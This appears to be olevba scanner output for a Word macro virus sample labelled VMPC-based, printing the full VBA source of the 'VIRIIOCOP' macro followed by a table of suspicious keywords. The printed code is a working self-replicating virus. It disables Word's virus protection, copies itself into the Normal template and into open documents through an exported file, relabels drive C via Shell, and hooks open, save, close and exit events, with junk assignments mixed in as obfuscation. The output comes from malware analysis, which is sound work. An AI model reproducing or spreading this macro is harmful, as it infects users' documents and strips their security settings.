olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-3c83cb5ddc49b96ab03ac5db342008606ca5f944
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-3c83cb5ddc49b96ab03ac5db342008606ca5f944 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VIRIIOCOP.bas 
in file: Virus.MSWord.VMPC-based-3c83cb5ddc49b96ab03ac5db342008606ca5f944 - OLE stream: 'Macros/VBA/VIRIIOCOP'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub VIRIIOCOP()
  
    'Poppy ID : 19662128-162 Compatable with SR-1
    'I Give You ---> VIRIIOCOP.Poppy !! Dig It !!
    
On Error Resume Next
f11250 = u1568 & c12538 & k12049 & m1568
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents("VIRIIOCOP").Export "c:\VIRIIOCOP.sys"
ActiveDocument.ReadOnlyRecommended = False
f9870 = u12558 & c14009 & Int(Rnd * 7556)
k6988 = m14024 & e7222
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "***********VIRIIO COP*******************"
    .Title = "***********VIRIIO*******************"
    .Subject = "***********VIRIIO*******************"
    .Comments = "***********VIRIIO*******************"
    .Keywords = "***********VIRIIO *******************"
    .Execute
End With
k10646 = m9019 & e11112
f13619 = u993 & c3418 & Int(Rnd * 3780)
f8251 = u16820 & c3013 & Int(Rnd * 1580)
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "VIRIIOCOP" Then pp1966212810 = True
Next I
k14265 = m17395 & e13749
k9232 = m16008 & e5160
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "VIRIIOCOP" Then Opiate21289 = True
Next I
f18011 = u10089 & c10543 & k10550 & m10089
If pp1966212810 = True And Opiate21289 = False Then Set w2128196612 = NormalTemplate.VBProject.VBComponents
If pp1966212810 = False And Opiate21289 = True Then Set w2128196612 = ActiveDocument.VBProject.VBComponents
w2128196612.import "c:\VIRIIOCOP.sys"
If pp1966212810 = True And Opiate21289 = False Then Shell ("label c: VIRIIO"), 0
f14846 = u18139 & c8237 & k6358 & m18139
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
f6632 = u11082 & c12014 & Int(Rnd * 5603)
f4834 = u12796 & c9165 & k9518 & m12796
f11084 = u4364 & c9757 & Int(Rnd * 8138)
If Opiate21289 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
k6797 = m6167 & e11008
k15143 = m13449 & e12313
'VMPCK v1.0c [SR-1 Compatable]
fuckoff:
End Sub
Sub FileSave()
    On Error Resume Next
f9240 = u7239 & c5362 & Int(Rnd * 1846)
k10922 = m5344 & e5107
    Call VIRIIOCOP
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
f15642 = u10664 & c9664 & Int(Rnd * 5337)
    Call VIRIIOCOP
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
k15296 = m14690 & e7275
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
k9203 = m9853 & e9233
    Call VIRIIOCOP
End Sub
Sub FileExit()
    On Error Resume Next
    Call VIRIIOCOP
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
k18514 = m11657 & e6883
f4608 = u11409 & c5768 & Int(Rnd * 756)
End Sub
Sub AutoOpen()
    On Error Resume Next
f15822 = u13213 & c11516 & k13797 & m13213
    Call VIRIIOCOP
f10215 = u12310 & c18640 & Int(Rnd * 9123)
End Sub
Sub AutoExit()
    On Error Resume Next
f16857 = u12469 & c5412 & Int(Rnd * 7471)
    Call VIRIIOCOP
f3216 = u7057 & c8168 & k3770 & m7057
k12736 = m9763 & e14089
End Sub
Sub AutoClose()
    On Error Resume Next
    Call VIRIIOCOP
f5072 = u9526 & c11634 & Int(Rnd * 7053)
f9226 = u11894 & c16290 & Int(Rnd * 8857)
End Sub
Sub ToolsMacro()
    On Error Resume Next
k4982 = m11747 & e12026
End Sub
Sub FileTemplates()
    On Error Resume Next
f12477 = u8715 & c7358 & Int(Rnd * 3799)
f12703 = u10101 & c756 & Int(Rnd * 9984)
k8545 = m7813 & e12809
End Sub
Sub ViewVBCode()
    On Error Resume Next
k10674 = m15174 & e7040
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

